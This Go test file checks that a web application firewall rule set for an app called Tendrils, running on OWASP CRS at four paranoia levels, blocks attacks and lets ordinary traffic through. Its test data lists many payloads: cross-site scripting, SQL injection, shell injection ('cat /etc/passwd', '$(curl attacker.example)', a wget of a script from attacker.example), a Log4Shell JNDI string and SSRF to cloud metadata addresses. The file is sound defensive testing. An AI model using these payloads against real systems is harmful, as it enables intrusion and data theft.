			for range 3 {
				for _, r := range g.requests() {
					send(r, "")
				}
				for _, r := range g.passwordRequests() {
					send(r, "")
				}
				for _, r := range append(append(g.mcpRequests(false), g.mcpRequests(true)...), g.aiRequests()...) {
					send(r, "")
				}
			}
			// What an agent writes, as a title, notes, an addition to them
			// and a search, the longest each takes, and many tokens.
			for _, text := range append(tdTitles, tdAgentText[:2]...) {
				send(g.tool(false, "create_task", map[string]any{"title": text}), " (an agent)")
				send(g.tool(true, "update_task", map[string]any{"task_id": g.id(), "version": 2, "title": text}), " (an agent)")
			}
			for _, text := range append(tdAgentText, tdProse...) {
				send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": text}), " (an agent)")
				send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 2, "notes_append": text}), " (an agent)")
				send(tdBody("POST", "/api/v1/ai/capture/break-down", map[string]any{"task_id": g.id(), "hint": text}), "")
			}
			for _, q := range tdSearches {
				send(g.tool(false, "search_tasks", map[string]any{"query": q}), " (an agent)")
			}
			long := []rune(strings.Repeat(strings.Join(tdAgentText, "\n\n")+"\n\n", 80))
			send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 9, "notes_append": string(long[:4000])}), " (4,000 characters)")
			send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": string(long[:20000])}), " (20,000 characters)")
			for range 500 {
				send(g.mcp(false, "ping", nil), " (a token)")
			}
			// Sessions whose token spells SQL, a comment or a hex number,
			// as one in five thousand does.
			for _, cookie := range []string{"4--cMnZjgKkDWYohOPzX_MSZ6bRiLm73fOqOBCuutxc", "7--hpHwzg3dELkfXDlpwH6W-MZX3zd9sZmgsRpW-TRk",
				"nB10yjgIF2-0x9eciysImNJe75pvImDf0hhYXbBZHzg", "Xm99haEdCG1-7TAf2YbFmzNFwWHlrPixf5oR77-Sj48", "N1jxdo3Y8m9ESi3yfUbFzrvSsyha3oR7-itM1RaspE0"} {
				if status := tdSend(t, plain, tdGet("/api/v1/views/counts?tz=UTC"), cookie); status != http.StatusOK {
					t.Errorf("the session %s: %d", cookie, status)
				}
			}
			// A passkey's answer and the push keys are random, and so is
			// the session in the cookie, so many of each.
			for range 40 {
				send(tdBody("POST", "/api/v1/auth/passkey/login/finish", map[string]any{"credential": g.credential(false)}), " (a passkey)")
				send(tdBody("POST", "/api/v1/auth/passkeys/register/finish", map[string]any{"credential": g.credential(true), "nickname": "Phone"}), " (a passkey)")
				send(tdBody("POST", "/api/v1/push/subscriptions", map[string]any{"endpoint": g.endpoint(),
					"keys": map[string]any{"p256dh": g.b64url(65), "auth": g.b64url(16)}}), " (a push subscription)")
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// tdAttack is an attack on a Tendrils site, and from the lowest paranoia
// level CRS alone refuses it at. Text is sent to CRS alone at paranoia 1.
type tdAttack struct {
	from int
	r    tdRequest
}

// An attack CRS alone refuses at a level is refused with the set loaded
// too, in an argument the client fills with ids, dates, zones, a repeat
// rule, a push address or a passkey's answer, in a password sent where no
// password goes, and in the session cookie. Text, which the set reads as
// paranoia 1 does, keeps what CRS alone refuses there but a command run
// under another, which plain sentences spell.
func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
	t.Parallel()
	g := td{vw{rand.New(rand.NewPCG(7, 22))}}
	const api = "/api/v1"
	task, space := g.id(), g.id()
	push := func(body map[string]any) tdRequest { return tdBody("POST", api+"/push/subscriptions", body) }
	keys := map[string]any{"p256dh": g.b64url(65), "auth": g.b64url(16)}
	signIn := func(field, value string) tdRequest {
		c := g.credential(false)
		c["response"].(map[string]any)[field] = value
		return tdBody("POST", api+"/auth/passkey/login/finish", map[string]any{"credential": c})
	}
	inText := []tdAttack{
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "<script>alert(document.cookie)</script>"})},
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x' UNION SELECT password FROM users--"})},
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the keys; cat /etc/passwd"})},
		{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": g.day(), "body": "${jndi:ldap://attacker.example/a}"})},
		{1, tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 1, "note": "1' OR '1'='1' --"})},
		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": `"><svg onload=alert(1)>`})},
		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "<img src=x onerror=alert(1)>", "color": "moss"})},
		{1, tdGet(api + "/search" + tdQuery("q", "x' UNION SELECT password FROM users--"))},
		{1, tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "todoist", "items": []any{
			map[string]any{"kind": "task", "title": "x", "notes": "1' OR '1'='1' --", "comments": []string{"<script>alert(1)</script>"}}}})},
		{1, g.tool(false, "create_task", map[string]any{"title": "<script>alert(document.cookie)</script>"})},
		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "notes_append": "x' UNION SELECT password FROM users--"})},
		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries, then <script>alert(1)</script>", "space_ids": []string{space}})},
		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries; uname -a", "space_ids": []string{space}})},
		{1, tdBody("POST", api+"/ai/capture/break-down", map[string]any{"task_id": task, "hint": "1' OR '1'='1' --"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "label": "<img src=x onerror=alert(1)>"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "extra": map[string]any{"stop": "x' UNION SELECT password FROM users--"}})},
	}
	attacks := []tdAttack{
		// Without a character only the rules that count them see. Where
		// the client sends ids, dates and zones these are marked, and read
		// as CRS reads them.
		{4, tdGet(api + "/tasks" + tdQuery("space", space, "parent", "a);(b", "completed", "recent"))},
		{4, tdGet(api + "/views/counts" + tdQuery("tz", "Etc/GMT+5;(x)"))},
		{1, tdGet(api + "/views/horizon" + tdQuery("from", "2026-10-13' AND SLEEP(5)--", "tz", "UTC"))},
		{4, tdBody("POST", api+"/notifications/read", map[string]any{"ids": []string{g.id(), "a);(b"}})},
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": "1; wget http://attacker.example/x.sh", "space_id": space, "title": "x"})},
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": "<img src=x onerror=alert(1)>", "title": "x"})},
		{3, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "due": map[string]any{"date": "((((((((("}})},
		{4, tdGet("/signin" + tdQuery("next", "//attacker.example/x"))},
		{1, tdGet("/signin" + tdQuery("next", "javascript:alert(1)"))},
		// Only the name id is not taken for the command.
		{3, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "ls": 1})},
		// A repeat rule's parts are names and values of words and numbers.
		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x",
			"recurrence": map[string]any{"rule": "FREQ=DAILY;INTERVAL=1' OR '1'='1", "mode": "schedule"}})},
		{1, tdBody("POST", api+"/recurrence/preview", map[string]any{"rule": "FREQ=DAILY;X=$(id)", "mode": "schedule"})},
		{1, tdBody("POST", api+"/recurrence/preview", map[string]any{"rule": "FREQ=WEEKLY;BYDAY=MO;X=1|su", "mode": "schedule"})},
		// The push service's address is https on a host with a name, one of
		// it, with URL characters and a base64 token's escapes only;
		// elsewhere an address is read.
		{1, push(map[string]any{"endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "keys": keys})},
		{2, push(map[string]any{"endpoint": "ftp://attacker.example/x.txt", "keys": keys})},
		{1, push(map[string]any{"endpoint": "https://push.example.com/x' UNION SELECT password FROM users--", "keys": keys})},
		{1, push(map[string]any{"endpoint": "https://push.example.com/w/?token=$(id)", "keys": keys})},
		{1, push(map[string]any{"endpoint": "https://push.example.com/x%27%20or%201=1--", "keys": keys})},
		{1, push(map[string]any{"endpoint": "https://push.example.com/w/?token=%27%20or%201%3D1--", "keys": keys})},
		{1, push(map[string]any{"endpoint": "https://203.0.113.7/x.txt", "keys": keys})},
		{2, push(map[string]any{"endpoint": "https://push.example.com/a", "Endpoint": "https://attacker.example/x.txt", "keys": keys})},
		{1, push(map[string]any{"endpoint": g.endpoint(), "keys": map[string]any{"p256dh": "1 UNION SELECT password FROM users", "auth": g.b64url(16)}})},
		{2, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "endpoint": "https://attacker.example/x.txt"})},
		// A passkey's answer is base64url.
		{1, signIn("signature", "x' OR 1=1--")},
		{1, signIn("clientDataJSON", "<script>alert(1)</script>")},
		{1, signIn("userHandle", "$(curl attacker.example)")},
		// A password is unread only where one goes, and a step-up's code
		// only with the password as the one method.
		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": "x", "password": "x' UNION SELECT password FROM users--"})},
		{1, tdBody("POST", api+"/auth/stepup/verify", map[string]any{"method": "totp", "code": "<script>alert(1)</script>"})},
		{1, tdBody("POST", api+"/auth/stepup/verify", map[string]any{"method": "password", "Method": "totp", "code": "x' UNION SELECT password FROM users--"})},
		// A command in the path is read everywhere but the one path that
		// ends in set.
		{1, tdGet(api + "/tasks/" + uriComponent("x&&whoami"))},
		{2, tdBody("POST", api+"/auth/password/set/"+uriComponent(";cat /etc/passwd"), map[string]any{"password": "x"})},
		// PUT, PATCH and DELETE are the API's alone. CRS alone refuses
		// them everywhere, so every other attack here is a GET or a POST.
		{1, tdRequest{method: "PUT", path: "/today"}},
		{1, tdRequest{method: "DELETE", path: "/assets/index.js"}},
		// An agent's arguments are ids, numbers, dates and words, and its
		// metadata only what the protocol names. A call's id is named like
		// the id command, which CRS alone refuses from paranoia 3; a
		// notification has none.
		{3, g.tool(false, "get_task", map[string]any{"task_id": "a);(b"})},
		{3, g.tool(true, "list_tasks", map[string]any{"space_id": "a);(b"})},
		{4, g.mcp(true, "notifications/cancelled", map[string]any{"requestId": "a);(b"})},
		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "parent_id": "1' OR '1'='1"})},
		{3, g.tool(false, "search_tasks", map[string]any{"query": "milk", "kinds": []string{"task", "a);(b"}})},
		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "due": "2026-10-13' AND SLEEP(5)--"})},
		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "position": "last;cat /etc/passwd"})},
		{1, g.tool(false, "get_task", map[string]any{"task_id": task, "x' OR 1=1--": 1})},
		{3, g.mcp(false, "ping", map[string]any{"_meta": map[string]any{"com.example/trace": "a);(b"}})},
		{4, g.mcp(false, "notifications/initialized", map[string]any{"_meta": map[string]any{"com.example/trace": "a);(b"}})},
		{4, g.mcp(false, "notifications/initialized", map[string]any{"_meta": map[string]any{"com.example/a);(b": 1}})},
		{1, g.mcp(false, "tools/call' UNION SELECT password FROM users--", nil)},
		// The same with only brackets, which fewer rules read.
		{3, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "due": "2026-10-13);("})},
		{2, g.tool(false, "move_task", map[string]any{"task_id": task, "position": "last)"})},
		{4, g.mcp(true, "notifications/initialized);(", nil)},
		// The AI features' ids and settings are ids and words, a model's
		// name has a shape, and a provider's address is a link with a host
		// by name or IPv4 address, one of it, where a provider goes; a
		// loopback or cloud metadata address is read everywhere.
		{4, tdBody("POST", api+"/ai/review/weekly", map[string]any{"job_id": "a);(b"})},
		{4, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "milk", "space_ids": []string{space, "a);(b"}})},
		{1, tdBody("POST", api+"/ai/review/briefing", map[string]any{"job_id": task, "preferred": "instance.x' OR '1'='1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "models": map[string]any{"fast": "llama' OR 1=1--"}})},
		{4, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "models": map[string]any{"smart": "a);(b"}})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://169.254.169.254/latest/meta-data/"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://localhost:11434/v1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://127.0.0.1:11434/v1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://127.0.0.2:11434/v1"})},
		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://0177.0.0.1:11434/v1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://2130706433:11434/v1"})},
		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://localhost:11434/v1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://ollama.localhost/v1"})},
		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://llm.example.com/v1?x=a);(b"})},
		{4, tdBody("POST", api+"/ai/review/briefing", map[string]any{"job_id": task, "preferred": "instance.a);(b"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "file:///etc/passwd"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://[2001:db8::10]:11434/v1"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://192.0.2.9:11434/v1?next=x"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://llm.example.com/v1?x=' OR 1=1--"})},
		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"base_url": "https://llm.example.com/v1", "Base_URL": "http://192.0.2.9/x"})},
		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "base_url": "http://192.0.2.9/x"})},
		// A key is unread only where one goes.
		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": "x", "key": "x' UNION SELECT password FROM users--"})},
		{1, tdBody("POST", api+"/ai/keys/openai", map[string]any{"api_key": "x' UNION SELECT password FROM users--"})},
		{1, tdBody("POST", api+"/admin/ai/providers/"+g.id()+"/test", map[string]any{"api_key": "x' UNION SELECT password FROM users--"})},
	}
	// The subtests run at once, so nothing draws from g inside them.
	session := g.token()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			bare, _ := planSite(t, pl, false)
			bareText := bare
			if pl > 1 {
				bareText, _ = planSite(t, 1, false)
			}
			plain, out := planSite(t, pl, true)
			check := func(name, bare string, level int, as []tdAttack) {
				for i, a := range as {
					r := a.r
					checkAttack(t, pl, level, a.from, fmt.Sprintf("%s[%d] %s %s %.100q", name, i, r.method, r.path, r.body),
						func(set bool) bool {
							if set {
								return tdSend(t, plain, r, session) == http.StatusForbidden
							}
							return tdSend(t, bare, r, session) == http.StatusForbidden
						})
				}
			}
			check("attacks", bare, pl, attacks)
			check("inText", bareText, 1, inText)
			// The count of special characters in cookies scores 3, too
			// little to refuse alone, so its events say whether it read the
			// cookie: never a session's token, whatever its dashes, and
			// anything else as CRS reads it.
			if pl == 4 {
				token, other, both := tdGet(api+"/views/counts?tz=UTC"), tdGet(api+"/views/counts?tz=Etc/UTC"), tdGet(api+"/views/counts?tz=Etc/GMT")
				tdSend(t, plain, token, "a-b-c-"+session[6:])
				tdSend(t, plain, other, "a'b(c)d"+session[7:])
				tdSend(t, plain, both, session+"; tendril_session=a'b(c)d"+session[7:])
				counted := func(uri string) bool {
					_, ok := findEvent(out, func(e wafevent.Event) bool {
						return e.URI == uri && slices.ContainsFunc(e.Rules, func(h wafevent.Hit) bool { return h.ID == 942421 })
					})
					return ok
				}
				waitFor(t, "the cookies' events", func() bool { return counted(other.path) && counted(both.path) })
				if counted(token.path) {
					t.Error("a session's token with three dashes was counted")
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}
